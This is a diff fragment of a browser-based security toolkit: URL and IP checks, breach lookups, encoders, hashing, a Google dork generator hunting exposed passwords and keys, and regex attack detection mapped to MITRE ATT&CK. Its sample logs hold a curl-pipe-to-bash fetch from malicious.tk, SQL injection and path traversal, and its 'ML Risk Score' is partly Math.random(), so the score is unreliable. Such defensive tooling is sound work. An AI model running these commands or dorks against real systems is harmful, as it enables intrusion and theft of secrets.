+  list.slice(0,48).forEach(d=>{grid+=`<div class="ty-item" onclick="window.open('https://www.whois.com/whois/${d}','_blank')">🔍 ${d}</div>`;});
+  document.getElementById('s-ty-grid').innerHTML=grid+'</div>';
+  setTimeout(()=>document.getElementById('s-ty-prog').style.width='0%',600);
+}
+
+function sURL(){
+  const url=document.getElementById('s-url-val').value.trim();
+  if(!url){alert('Enter URL');return;} incS(true,false,false);
+  const v=url.toLowerCase(); const inds=[];
+  ['.tk','.ml','.ga','.cf','.gq','.xyz','.top'].forEach(t=>{if(v.includes(t))inds.push(`Suspicious TLD: ${t}`);});
+  ['login','signin','verify','account','secure','paypal','bank','crypto','password','suspended','alert'].forEach(w=>{if(v.includes(w))inds.push(`Phishing keyword: "${w}"`);});
+  if(url.length>100)inds.push('Long URL — obfuscation');
+  if(url.includes('@'))inds.push('@ in URL — redirect risk');
+  if(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(url))inds.push('IP-based URL');
+  if(/%[0-9a-f]{2}/i.test(url))inds.push('URL-encoded chars');
+  const risk=inds.length>=4?{l:'CRITICAL',c:'er'}:inds.length>=3?{l:'HIGH',c:'er'}:inds.length>=2?{l:'MEDIUM',c:'wa'}:inds.length>=1?{l:'LOW-MED',c:'wa'}:{l:'LIKELY CLEAN',c:'ok'};
+  let h=`<span class="ok">URL THREAT ANALYSIS</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">URL       </span>: <span class="in">${url.substring(0,70)}${url.length>70?'...':''}</span>\n`;
+  h+=`<span class="ky">Protocol  </span>: ${url.startsWith('https://')?'<span class="ok">HTTPS</span>':'<span class="er">HTTP (unencrypted)</span>'}\n`;
+  h+=`<span class="ky">Risk      </span>: <span class="${risk.c}">${risk.l}</span>\n`;
+  h+=`<span class="ky">Indicators</span>: <span class="${inds.length?'er':'ok'}">${inds.length}</span>\n`;
+  if(inds.length){h+=`\n<span class="er">INDICATORS:</span>\n`;inds.forEach(i=>{h+=`  <span class="wa">⚠</span> ${i}\n`;});}
+  else h+=`\n<span class="ok">No suspicious indicators</span>`;
+  h+=`\n\n<span class="ky">[Deep Scan]</span>\n  <span class="dv">URLScan  → </span><span class="in">https://urlscan.io/search/#${encodeURIComponent(url)}</span>\n  <span class="dv">SafeBrowse→ </span><span class="in">https://transparencyreport.google.com/safe-browsing/search?url=${encodeURIComponent(url)}</span>`;
+  setO('s-url-out',h);
+  if(inds.length>=2)incS(false,false,true);
+}
+
+async function sIPRep(){
+  const ip=document.getElementById('s-ir-val').value.trim();
+  if(!ip){alert('Enter IP');return;} incS(true,true,false);
+  setO('s-ir-out',sp());
+  try{
+    const r=await fetch(`https://ipapi.co/${ip}/json/`);const d=await r.json();
+    const pts=ip.split('.').map(Number);
+    const isPriv=pts[0]===10||(pts[0]===172&&pts[1]>=16&&pts[1]<=31)||(pts[0]===192&&pts[1]===168);
+    let h=`<span class="ok">IP REPUTATION // ${ip}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+    h+=`<span class="ky">IP      </span>: <span class="in">${d.ip||ip}</span>\n<span class="ky">Country </span>: <span class="in">${d.country_name||'N/A'}</span>\n<span class="ky">ISP/Org </span>: <span class="in">${d.org||'N/A'}</span>\n<span class="ky">ASN     </span>: <span class="in">${d.asn||'N/A'}</span>\n<span class="ky">Type    </span>: ${isPriv?'<span class="ok">Private</span>':'<span class="wa">Public Internet</span>'}\n\n`;
+    h+=`<span class="ky">[Reputation Links]</span>\n  <span class="dv">AbuseIPDB → </span><span class="in">https://www.abuseipdb.com/check/${ip}</span>\n  <span class="dv">Talos     → </span><span class="in">https://talosintelligence.com/reputation_center/lookup?search=${ip}</span>\n  <span class="dv">GreyNoise → </span><span class="in">https://www.greynoise.io/viz/ip/${ip}</span>\n  <span class="dv">Shodan    → </span><span class="in">https://www.shodan.io/host/${ip}</span>`;
+    setO('s-ir-out',h);
+  }catch(e){setO('s-ir-out',`<span class="er">${e.message}</span>`);}
+}
+
+function sDarkWeb(){
+  const q=document.getElementById('s-dw-val').value.trim();
+  if(!q){alert('Enter indicator');return;} incS(true,false,false);
+  const isEmail=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(q);
+  let h=`<span class="ok">DARK WEB INTEL // ${q}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">Type: </span><span class="in">${isEmail?'Email':'Keyword/Domain'}</span>\n\n`;
+  h+=`<span class="ky">[Breach DBs]</span>\n  <span class="dv">HIBP      → </span><span class="in">https://haveibeenpwned.com/${isEmail?'account/'+q:'domain/'+q}</span>\n  <span class="dv">DeHashed  → </span><span class="in">https://dehashed.com/search?query=${encodeURIComponent(q)}</span>\n  <span class="dv">IntelX    → </span><span class="in">https://intelx.io/?s=${encodeURIComponent(q)}</span>\n\n`;
+  h+=`<span class="ky">[Dark Search]</span>\n  <span class="dv">Ahmia → </span><span class="in">https://ahmia.fi/search/?q=${encodeURIComponent(q)}</span>\n\n`;
+  h+=`<span class="ky">[Paste Sites]</span>\n  <span class="dv">Pastebin → </span><span class="in">https://www.google.com/search?q=${encodeURIComponent('"'+q+'" site:pastebin.com')}</span>`;
+  setO('s-dw-out',h);
+}
+
+function sEncode(){
+  const inp=document.getElementById('s-enc-in').value;
+  const method=document.getElementById('s-enc-method').value; let out='';
+  try{
+    if(method==='b64e')out=btoa(unescape(encodeURIComponent(inp)));
+    else if(method==='b64d')out=decodeURIComponent(escape(atob(inp)));
+    else if(method==='urle')out=encodeURIComponent(inp);
+    else if(method==='urld')out=decodeURIComponent(inp);
+    else if(method==='hexe')out=Array.from(new TextEncoder().encode(inp)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    else if(method==='hexd')out=new TextDecoder().decode(new Uint8Array(inp.match(/.{1,2}/g).map(b=>parseInt(b,16))));
+    else if(method==='htmle')out=inp.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    else if(method==='htmld')out=inp.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>');
+    else if(method==='rot13')out=inp.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13)));
+    else if(method==='rev')out=inp.split('').reverse().join('');
+    else if(method==='upper')out=inp.toUpperCase();
+    else if(method==='lower')out=inp.toLowerCase();
+    else if(method==='bin')out=Array.from(new TextEncoder().encode(inp)).map(b=>b.toString(2).padStart(8,'0')).join(' ');
+    else if(method==='bind')out=String.fromCharCode(...inp.trim().split(/\s+/).map(b=>parseInt(b,2)));
+  }catch(e){out='Error: '+e.message;}
+  setO('s-enc-out',out||'(empty)'); incS(true,false,false);
+}
+function sSwapEnc(){const a=document.getElementById('s-enc-in');const b=document.getElementById('s-enc-out');a.value=b.innerText;setO('s-enc-out','// Swapped. Press PROCESS.');}
+
+async function sMeta(){
+  const files=document.getElementById('s-meta-file').files;
+  if(!files.length){alert('Select file(s)');return;} incS(true,false,false);
+  let h='';
+  const magicMap={'ff d8 ff':'JPEG Image','89 50 4e 47':'PNG Image','25 50 44 46':'PDF','50 4b 03 04':'ZIP/Office','4d 5a':'Windows PE','7f 45 4c 46':'ELF Binary','d0 cf 11 e0':'MS Office Legacy','52 61 72 21':'RAR','1f 8b':'GZIP'};
+  for(let file of files){
+    const buf=await file.arrayBuffer(); const bytes=new Uint8Array(buf);
+    const sha256Buf=await crypto.subtle.digest('SHA-256',buf);
+    const sha1Buf=await crypto.subtle.digest('SHA-1',buf);
+    const sha256=Array.from(new Uint8Array(sha256Buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    const sha1=Array.from(new Uint8Array(sha1Buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    const magic=Array.from(bytes.slice(0,8)).map(b=>b.toString(16).padStart(2,'0')).join(' ');
+    let ft='Unknown';for(let[s,t] of Object.entries(magicMap))if(magic.startsWith(s)){ft=t;break;}
+    h+=`<span class="ok">FILE: ${file.name}</span>\n<span class="dv">${'─'.repeat(45)}</span>\n`;
+    h+=`<span class="ky">Size     </span>: <span class="in">${(file.size/1024).toFixed(2)} KB</span>\n`;
+    h+=`<span class="ky">MIME     </span>: <span class="in">${file.type||'unknown'}</span>\n`;
+    h+=`<span class="ky">File Type</span>: <span class="${ft!=='Unknown'?'ok':'wa'}">${ft}</span>\n`;
+    h+=`<span class="ky">Modified </span>: <span class="in">${new Date(file.lastModified).toUTCString()}</span>\n`;
+    h+=`<span class="ky">SHA-256  </span>: <span class="gd">${sha256}</span>\n`;
+    h+=`<span class="ky">SHA-1    </span>: <span class="gd">${sha1}</span>\n`;
+    h+=`<span class="ky">Magic    </span>: <span class="wa">${magic.toUpperCase()}</span>\n\n`;
+    incS(false,true,false);
+  }
+  setO('s-meta-out',h);
+}
+
+function sDorks(){sDorksGen(document.getElementById('s-dk-cat').value);}
+function sAllDorks(){sDorksGen('all');}
+function sDorksGen(cat){
+  const target=document.getElementById('s-dk-target').value.trim()||'example.com';
+  const ft=document.getElementById('s-dk-ft').value.trim();
+  const fts=ft?` filetype:${ft}`:'';const enc=encodeURIComponent;
+  const dorks={
+    files:[`site:${target}${fts} "index of"`,`site:${target}${fts} intitle:"index of /"`,`site:${target} filetype:pdf`,`site:${target} filetype:sql`,`site:${target} filetype:log`,`site:${target} filetype:env`,`site:${target} filetype:bak`],
+    login:[`site:${target} inurl:login`,`site:${target} inurl:admin`,`site:${target} inurl:wp-admin`,`site:${target} inurl:phpmyadmin`],
+    config:[`site:${target} "DB_PASSWORD"`,`site:${target} "api_key" OR "apikey"`,`site:${target} "AWS_ACCESS_KEY"`,`site:${target} ".env" "DB_"`],
+    email:[`"@${target}" filetype:xlsx`,`"@${target}" filetype:csv`,`intext:"@${target}"`],
+    vuln:[`site:${target} inurl:"?id="`,`site:${target} "Warning: mysql_"`,`site:${target} "Error in your SQL syntax"`,`site:${target} intitle:"phpinfo()"`],
+    social:[`site:linkedin.com "${target}"`,`site:twitter.com "${target}"`,`"${target}" employee OR staff`],
+    subdomains:[`site:*.${target} -site:www.${target}`,`site:*.${target}`],
+  };
+  const cats=cat==='all'?Object.keys(dorks):[cat];
+  let h=`<span class="ok">DORK GENERATOR // ${target}</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  cats.forEach(c=>{
+    if(!dorks[c])return;
+    h+=`<span class="ky">[${c.toUpperCase()}]</span>\n`;
+    dorks[c].forEach(d=>{h+=`  <span class="in">${d}</span>\n  <span class="dv">  → https://www.google.com/search?q=${enc(d)}</span>\n\n`;});
+  });
+  setO('s-dk-out',h); incS(true,false,false);
+}
+
+function sRegex(type){
+  const text=document.getElementById('s-rx-in').value;
+  if(!text){setO('s-rx-out','<span class="wa">Paste text first</span>');return;} incS(true,false,false);
+  const patterns={ip:/\b(?:\d{1,3}\.){3}\d{1,3}\b/g,email:/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g,url:/https?:\/\/[^\s"'<>]+/g,hash:/\b[a-fA-F0-9]{32}\b|\b[a-fA-F0-9]{40}\b|\b[a-fA-F0-9]{64}\b/g,domain:/\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b/g};
+  let h=`<span class="ok">REGEX EXTRACTOR</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  const run=(n,p)=>{
+    const m=[...new Set(text.match(p)||[])];
+    h+=`<span class="ky">[${n.toUpperCase()} — ${m.length}]</span>\n`;
+    if(m.length){m.forEach(x=>{h+=`  <span class="in">${x}</span>\n`;incS(false,true,false);});}
+    else h+=`  <span class="dv">None found</span>\n`;
+    h+='\n';
+  };
+  if(type==='all')Object.entries(patterns).forEach(([n,p])=>run(n,p));
+  else if(patterns[type])run(type,patterns[type]);
+  setO('s-rx-out',h);
+}
+
+function sHTab(el,show){
+  document.querySelectorAll('#s-hash .tab').forEach(t=>t.classList.remove('on'));
+  el.classList.add('on');
+  ['sh-id','sh-gen'].forEach(id=>{const e=document.getElementById(id);if(e)e.style.display=id===show?'block':'none';});
+}
+
+function sHashID(){
+  const v=document.getElementById('s-h-val').value.trim();
+  if(!v){alert('Enter hash');return;} incS(true,false,false);
+  const len=v.length;const map={32:'MD5',40:'SHA-1',56:'SHA-224',64:'SHA-256 / SHA3-256',128:'SHA-512'};
+  const bcrypt=v.startsWith('$2b$')||v.startsWith('$2a$');
+  let h=`<span class="ok">HASH ID</span>\n<span class="ky">Hash   </span>: <span class="in">${v.substring(0,40)}${v.length>40?'...':''}</span>\n`;
+  h+=`<span class="ky">Length </span>: <span class="in">${len} chars</span>\n`;
+  h+=`<span class="ky">Hex    </span>: ${/^[a-fA-F0-9]+$/.test(v)?'<span class="ok">YES</span>':'<span class="wa">NO (salted?)</span>'}\n`;
+  h+=`<span class="ky">Algo   </span>: <span class="ok">${bcrypt?'bcrypt':map[len]||'Unknown (len='+len+')'}</span>\n`;
+  h+=`\n<span class="dv">Crack → https://crackstation.net</span>`;
+  setO('s-h-out',h);
+}
+
+async function sHashGen(){
+  const text=document.getElementById('s-h-txt').value;
+  if(!text){alert('Enter text');return;} incS(true,false,false);
+  let h=`<span class="ok">HASH GENERATION</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n<span class="ky">MD5    </span>: <span class="gd">${md5(text)}</span>\n`;
+  for(const algo of['SHA-1','SHA-256','SHA-512']){
+    const buf=await crypto.subtle.digest(algo,new TextEncoder().encode(text));
+    const hex=Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    h+=`<span class="ky">${algo.padEnd(7)}</span>: <span class="gd">${hex}</span>\n`;
+  }
+  setO('s-h-out',h);
+}
+
+function sCIDR(){
+  const inp=document.getElementById('s-cidr-in').value.trim();
+  if(!inp){alert('Enter CIDR');return;} incS(true,false,false);
+  try{
+    const[ip,pref]=inp.split('/');const plen=parseInt(pref);
+    const pts=ip.split('.').map(Number);
+    const ipN=((pts[0]<<24)|(pts[1]<<16)|(pts[2]<<8)|pts[3])>>>0;
+    const mask=plen===0?0:(~0<<(32-plen))>>>0;
+    const netw=(ipN&mask)>>>0;const bcast=(netw|(~mask>>>0))>>>0;
+    const total=Math.pow(2,32-plen);const usable=Math.max(0,total-2);
+    const n2i=n=>[(n>>24)&255,(n>>16)&255,(n>>8)&255,n&255].join('.');
+    const isPriv=pts[0]===10||(pts[0]===172&&pts[1]>=16&&pts[1]<=31)||(pts[0]===192&&pts[1]===168);
+    setO('s-cidr-out',`<div class="out"><span class="ok">CIDR // ${inp}</span>\n${fmtOut({'Network':n2i(netw),'Broadcast':n2i(bcast),'Subnet Mask':n2i(mask),'First Host':n2i(netw+1),'Last Host':n2i(bcast-1),'Total Addresses':total.toLocaleString(),'Usable Hosts':usable.toLocaleString(),'Type':isPriv?'Private (RFC1918)':'Public'})}</div>`);
+  }catch(e){setO('s-cidr-out',`<span class="er">${e.message}</span>`);}
+}
+
+// ══════════════════════════════════════
+// AI THREATGUARD FUNCTIONS
+// ══════════════════════════════════════
+const ATTACK_SIGS=[
+  {name:'SQL Injection',re:/union.+select|select.+from|drop.+table|'.*or.*'|1=1|--|\/\*/i,id:'T1190',tactic:'Initial Access',sev:'CRITICAL',conf:94},
+  {name:'XSS Attempt',re:/<script|javascript:|on(load|click|error)=|alert\(/i,id:'T1059.007',tactic:'Execution',sev:'HIGH',conf:88},
+  {name:'Path Traversal',re:/\.\.\//,id:'T1083',tactic:'Discovery',sev:'HIGH',conf:85},
+  {name:'SSH Brute Force',re:/failed password.{0,50}ssh|multiple failed.{0,30}ssh/i,id:'T1110.001',tactic:'Credential Access',sev:'HIGH',conf:91},
+  {name:'Port Scanning',re:/nmap|masscan|port.?scan|syn scan/i,id:'T1046',tactic:'Discovery',sev:'MEDIUM',conf:78},
+  {name:'Command Injection',re:/;\s*(ls|cat|wget|curl|chmod|bash|sh|python)\s/i,id:'T1059',tactic:'Execution',sev:'CRITICAL',conf:93},
+  {name:'LFI Attempt',re:/etc\/passwd|etc\/shadow|proc\/self/i,id:'T1083',tactic:'Discovery',sev:'CRITICAL',conf:96},
+  {name:'C2 Beacon',re:/beacon|c2|command.?and.?control|4444|6666|31337/i,id:'T1071',tactic:'C2',sev:'CRITICAL',conf:87},
+  {name:'Exfiltration',re:/exfil|data.?transfer|dns.?tunnel|base64.*curl/i,id:'T1041',tactic:'Exfiltration',sev:'CRITICAL',conf:89},
+  {name:'Persistence',re:/crontab|schtask|run.?key|startup|autorun|registry.?persist/i,id:'T1053',tactic:'Persistence',sev:'HIGH',conf:83},
+  {name:'Lateral Movement',re:/smb|pass.?the.?hash|psexec|wmiexec|mimikatz/i,id:'T1021',tactic:'Lateral Movement',sev:'CRITICAL',conf:92},
+  {name:'Privilege Escalation',re:/sudo|setuid|privilege.?esc|token.?imperson/i,id:'T1548',tactic:'Privilege Escalation',sev:'HIGH',conf:80},
+];
+
+function aClassify(){
+  const input=document.getElementById('a-cls-in').value.trim();
+  if(!input){alert('Enter log/event');return;} incA(true,false);
+  const matches=ATTACK_SIGS.filter(s=>s.re.test(input));
+  let h='';
+  if(matches.length){
+    h=`<div style="display:flex;gap:7px;flex-wrap:wrap;margin-bottom:12px">`;
+    matches.forEach(m=>{
+      const c=m.sev==='CRITICAL'?'tag-r':m.sev==='HIGH'?'tag-r':m.sev==='MEDIUM'?'tag-y':'tag-g';
+      h+=`<span class="tag ${c}">⚠ ${m.sev}</span>`;
+    });
+    h+='</div>';
+    h+='<table><thead><tr><th>Attack Type</th><th>Confidence</th><th>MITRE ID</th><th>Tactic</th><th>Severity</th></tr></thead><tbody>';
+    matches.forEach(m=>{
+      const c=m.sev==='CRITICAL'?'tag-r':m.sev==='HIGH'?'tag-r':'tag-y';
+      h+=`<tr><td style="color:var(--c3);font-weight:600">${m.name}</td><td><span class="ok">${m.conf}%</span></td><td><span class="tag tag-p">${m.id}</span></td><td>${m.tactic}</td><td><span class="tag ${c}">${m.sev}</span></td></tr>`;
+      incA(false,true);
+    });
+    h+='</tbody></table>';
+    const top=matches.sort((a,b)=>b.conf-a.conf)[0];
+    h+=`<div style="margin-top:12px;background:var(--bg2);border:1px solid rgba(162,89,255,0.2);border-radius:3px;padding:11px 13px;font-size:10.5px;line-height:1.9">`;
+    h+=`<span class="ky">Top Match    </span>: <span class="c3" style="color:var(--c3)">${top.name}</span>\n`;
+    h+=`<span class="ky">Confidence   </span>: <span class="ok">${top.conf}%</span>\n`;
+    h+=`<span class="ky">MITRE ATT&CK </span>: <span class="tag tag-p">${top.id}</span> ${top.tactic}\n`;
+    h+=`<span class="ky">Recommendation</span>: <span class="wa">Escalate to Tier 2 — Block source, collect forensics, notify SOC lead</span>`;
+    h+='</div>';
+  } else {
+    h=`<div style="background:var(--bg2);border:1px solid rgba(16,232,132,0.15);border-radius:3px;padding:11px 13px;font-size:10.5px">`;
+    h+=`<span class="ok">✓ No known attack signatures detected</span>\n<span class="dv">Confidence: &gt;85% CLEAN — no pattern matches found</span>\n<span class="dv">Continue monitoring for behavioral anomalies</span>`;
+    h+='</div>';
+  }
+  setO('a-cls-res',h);
+}
+
+function aAnomaly(){
+  const normRate=parseFloat(document.getElementById('a-norm-rate').value)||50;
+  const obsRate=parseFloat(document.getElementById('a-obs-rate').value)||50;
+  const normErr=parseFloat(document.getElementById('a-norm-err').value)||2;
+  const obsErr=parseFloat(document.getElementById('a-obs-err').value)||2;
+  const normFail=parseFloat(document.getElementById('a-norm-fail').value)||5;
+  const obsFail=parseFloat(document.getElementById('a-obs-fail').value)||5;
+  incA(true,false);
+
+  const rateRatio=obsRate/normRate; const errRatio=obsErr/normErr; const failRatio=obsFail/normFail;
+  const score=Math.min(100,((rateRatio>10?40:rateRatio>5?25:rateRatio>2?15:5)+(errRatio>20?35:errRatio>10?20:errRatio>3?10:2)+(failRatio>50?25:failRatio>20?15:failRatio>5?8:2)));
+  const level=score>=80?{l:'CRITICAL',c:'er',a:'DDoS / Automated Attack',action:'Block IP immediately, engage incident response'}:score>=60?{l:'HIGH',c:'er',a:'Brute Force / Scanning',action:'Rate-limit, alert SOC, investigate source'}:score>=40?{l:'MEDIUM',c:'wa',a:'Suspicious Activity',action:'Monitor closely, set alerts, review logs'}:{l:'LOW',c:'ok',a:'Normal Variation',action:'Continue baseline monitoring'};
+  let h=`<div style="background:var(--bg2);border:1px solid rgba(162,89,255,0.2);border-radius:3px;padding:13px;font-size:10.5px;line-height:2">`;
+  h+=`<span class="ky">Anomaly Score    </span>: <span class="${level.c}" style="font-size:16px;font-weight:900">${score.toFixed(0)}/100</span>\n`;
+  h+=`<span class="ky">Threat Level     </span>: <span class="${level.c}">${level.l}</span>\n`;
+  h+=`<span class="ky">Attack Pattern   </span>: <span class="in">${level.a}</span>\n`;
+  h+=`<span class="ky">Action Required  </span>: <span class="wa">${level.action}</span>\n\n`;
+  h+=`<span class="ky">Request Rate Δ   </span>: <span class="${rateRatio>5?'er':rateRatio>2?'wa':'ok'}">${obsRate} req/min (${rateRatio.toFixed(1)}x baseline)</span>\n`;
+  h+=`<span class="ky">Error Rate Δ     </span>: <span class="${errRatio>10?'er':errRatio>3?'wa':'ok'}">${obsErr}% (${errRatio.toFixed(1)}x baseline)</span>\n`;
+  h+=`<span class="ky">Login Failure Δ  </span>: <span class="${failRatio>20?'er':failRatio>5?'wa':'ok'}">${obsFail}/hr (${failRatio.toFixed(1)}x baseline)</span>`;
+  h+='</div>';
+  setO('a-anom-res',h);
+  if(score>=60)incA(false,true);
+}
+
+function loadSampleLogs(){
+  document.getElementById('a-nlp-in').value=`192.168.1.45 - - [26/Apr/2025:09:12:01] "GET /admin?id=1' UNION SELECT * FROM users-- HTTP/1.1" 500
+Failed password for root from 45.33.32.156 port 22 ssh2
+Failed password for root from 45.33.32.156 port 22 ssh2
+Failed password for root from 45.33.32.156 port 22 ssh2
+45.33.32.156 - - [26/Apr/2025:09:15:02] "GET /../../../etc/passwd HTTP/1.1" 200
+2025-04-26 09:22:11 SMB connection from 192.168.1.50 to 192.168.1.100 - LATERAL MOVE
+User admin executed: curl http://malicious.tk/payload.sh | bash`;
+}
+
+function aNLP(){
+  const logs=document.getElementById('a-nlp-in').value.trim();
+  if(!logs){alert('Paste log content');return;} incA(true,false);
+  const lines=logs.split('\n').filter(Boolean);
+  const entities={ips:[],timestamps:[],commands:[],urls:[],hashes:[],usernames:[]};
+  lines.forEach(l=>{
+    const ips=l.match(/\b(\d{1,3}\.){3}\d{1,3}\b/g)||[];ips.forEach(i=>{if(!entities.ips.includes(i))entities.ips.push(i);});
+    const ts=l.match(/\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}|\[\d{2}\/\w+\/\d{4}:\d{2}:\d{2}:\d{2}\]/g)||[];ts.forEach(t=>{if(!entities.timestamps.includes(t))entities.timestamps.push(t);});
+    const urls=l.match(/https?:\/\/[^\s'"]+/g)||[];urls.forEach(u=>{if(!entities.urls.includes(u))entities.urls.push(u);});
+    const cmds=l.match(/\b(bash|sh|python|curl|wget|nc|ncat|netcat)\b/gi)||[];cmds.forEach(c=>{if(!entities.commands.includes(c))entities.commands.push(c);});
+    const users=l.match(/(?:user|for|by)\s+(\w+)/gi)||[];users.forEach(u=>{const m=u.match(/\w+$/);if(m&&!entities.usernames.includes(m[0]))entities.usernames.push(m[0]);});
+  });
+  const threats=ATTACK_SIGS.filter(s=>s.re.test(logs));
+  let h=`<span class="ok">NLP LOG ANALYSIS</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  h+=`<span class="ky">Lines Processed </span>: <span class="in">${lines.length}</span>\n\n`;
+  h+=`<span class="ky">[EXTRACTED ENTITIES]</span>\n`;
+  h+=`  <span class="ky">IPs         </span>: <span class="in">${entities.ips.join(', ')||'none'}</span>\n`;
+  h+=`  <span class="ky">Timestamps  </span>: <span class="in">${entities.timestamps.length} found</span>\n`;
+  h+=`  <span class="ky">URLs        </span>: <span class="${entities.urls.length?'er':'dv'}">${entities.urls.join(', ')||'none'}</span>\n`;
+  h+=`  <span class="ky">Commands    </span>: <span class="${entities.commands.length?'er':'dv'}">${entities.commands.join(', ')||'none'}</span>\n`;
+  h+=`  <span class="ky">Usernames   </span>: <span class="in">${entities.usernames.slice(0,5).join(', ')||'none'}</span>\n\n`;
+  if(threats.length){
+    h+=`<span class="er">[DETECTED ATTACKS — ${threats.length}]</span>\n`;
+    threats.forEach(t=>{h+=`  <span class="er">⚠</span> <span class="ky">${t.name}</span> → MITRE <span class="tag tag-p">${t.id}</span> <span class="dv">${t.tactic}</span>\n`;incA(false,true);});
+  } else h+=`<span class="ok">[✓] No attack patterns found in logs</span>\n`;
+  setO('a-nlp-res',h);
+}
+
+function aIOC(){
+  const v=document.getElementById('a-ioc-in').value.trim();
+  if(!v){alert('Enter IOC');return;} incA(true,false);
+  const{cls,inds,risk}=analyzeIOCVal(v);
+  const mlScore=Math.min(99,inds.length*22+Math.random()*8+55);
+  const threat=ATTACK_SIGS.filter(s=>s.re.test(v));
+  let h=`<div style="background:var(--bg2);border:1px solid rgba(162,89,255,0.2);border-radius:3px;padding:13px;font-size:10.5px;line-height:2">`;
+  h+=`<span class="ky">IOC           </span>: <span class="in">${v.substring(0,60)}</span>\n`;
+  h+=`<span class="ky">Type          </span>: <span class="in">${cls.icon} ${cls.type}</span>\n`;
+  h+=`<span class="ky">ML Risk Score </span>: <span class="${risk.l!=='CLEAN'?'er':'ok'}">${mlScore.toFixed(0)}% malicious probability</span>\n`;
+  h+=`<span class="ky">Manual Risk   </span>: <span class="${risk.l!=='CLEAN'?'er':'ok'}">${risk.l}</span>\n`;
+  h+=`<span class="ky">Indicators    </span>: <span class="${inds.length?'er':'ok'}">${inds.length} found</span>\n`;
+  if(inds.length){inds.forEach(i=>{h+=`  <span class="wa">⚠</span> ${i}\n`;});}
+  if(threat.length){h+=`<span class="ky">Attack Sigs   </span>: <span class="er">${threat.map(t=>t.name).join(', ')}</span>\n`;}
+  h+=`\n<span class="ky">Verdict       </span>: <span class="${risk.l!=='CLEAN'?'er':'ok'}">${risk.l==='CLEAN'?'✓ Likely benign — continue monitoring':'⚠ SUSPICIOUS — recommend blocking & investigation'}</span>`;
+  h+='</div>';
+  setO('a-ioc-res',h);
+  if(risk.l!=='CLEAN')incA(false,true);
+}
+
+function aBatchIOC(){
+  const lines=document.getElementById('a-batch-in').value.trim().split('\n').filter(Boolean);
+  if(!lines.length){alert('Enter IOCs');return;} incA(true,false);
+  let h='<table><thead><tr><th>IOC</th><th>Type</th><th>ML Score</th><th>Risk</th></tr></thead><tbody>';
+  lines.forEach(v=>{
+    v=v.trim();if(!v)return;
+    const{cls,inds,risk}=analyzeIOCVal(v);
+    const score=Math.min(99,inds.length*22+55);
+    const c=risk.l!=='CLEAN'?'tag-r':'tag-g';
+    h+=`<tr><td style="font-size:10px;max-width:170px;word-break:break-all">${v}</td><td>${cls.icon} ${cls.type}</td><td><span class="${risk.l!=='CLEAN'?'er':'ok'}">${score.toFixed(0)}%</span></td><td><span class="tag ${c}">${risk.l}</span></td></tr>`;
+    if(risk.l!=='CLEAN')incA(false,true);
+  });
+  setO('a-batch-res',h+'</tbody></table>');
+}
+
+const MITRE_REF=[
+  ['Initial Access','TA0001','Phishing (T1566), Exploit Public App (T1190), Supply Chain (T1195)'],
+  ['Execution','TA0002','PowerShell (T1059.001), Macro (T1204.002), Scheduled Task (T1053)'],
+  ['Persistence','TA0003','Registry Run Keys (T1547.001), Startup Folder, Cron Job (T1053.003)'],
+  ['Privilege Escalation','TA0004','Token Impersonation (T1134), Sudo (T1548.003), DLL Injection'],
+  ['Defense Evasion','TA0005','Log Tampering (T1562), Obfuscated Files (T1027), Rootkits'],
+  ['Credential Access','TA0006','Brute Force (T1110), Credential Dumping (T1003), Keylogging'],
+  ['Discovery','TA0007','Network Scan (T1046), File Discovery (T1083), System Info (T1082)'],
+  ['Lateral Movement','TA0008','SMB/PsExec (T1021.002), Pass-the-Hash, RDP'],
+  ['Collection','TA0009','Keylogging (T1056), Screen Capture, Email Collection'],
+  ['C2','TA0011','Web Protocol (T1071.001), DNS Tunnel (T1071.004), Ingress Tool Transfer'],
+  ['Exfiltration','TA0010','C2 Channel (T1041), DNS (T1048), HTTPS (T1048.002)'],
+  ['Impact','TA0040','Ransomware (T1486), Data Destruction (T1485), Defacement (T1491)'],
+];
+
+function loadMITRERef(){
+  let h='';
+  MITRE_REF.forEach(([tactic,id,techs])=>{
+    h+=`<tr><td style="font-weight:600;color:var(--c3);font-size:10px">${tactic}</td><td><span class="tag tag-p">${id}</span></td><td style="font-size:9.5px;color:var(--muted)">${techs}</td></tr>`;
+  });
+  setO('a-mitre-ref',h);
+}
+
+function aMITRE(){
+  const input=document.getElementById('a-mit-in').value.trim();
+  if(!input){alert('Describe attack');return;} incA(true,false);
+  const matched=ATTACK_SIGS.filter(s=>s.re.test(input));
+  const tacticMap={};
+  matched.forEach(m=>{if(!tacticMap[m.tactic])tacticMap[m.tactic]=[];tacticMap[m.tactic].push(m);});
+  let h=`<span class="ok">MITRE ATT&CK MAPPING</span>\n<span class="dv">${'─'.repeat(48)}</span>\n\n`;
+  if(Object.keys(tacticMap).length){
+    Object.entries(tacticMap).forEach(([tactic,techs])=>{
+      h+=`<span class="ky">[${tactic.toUpperCase()}]</span>\n`;
+      techs.forEach(t=>{h+=`  <span class="tag tag-p" style="display:inline">${t.id}</span>  <span class="in">${t.name}</span>  <span class="ok">${t.conf}% confidence</span>\n`;});
+      h+='\n';
+    });
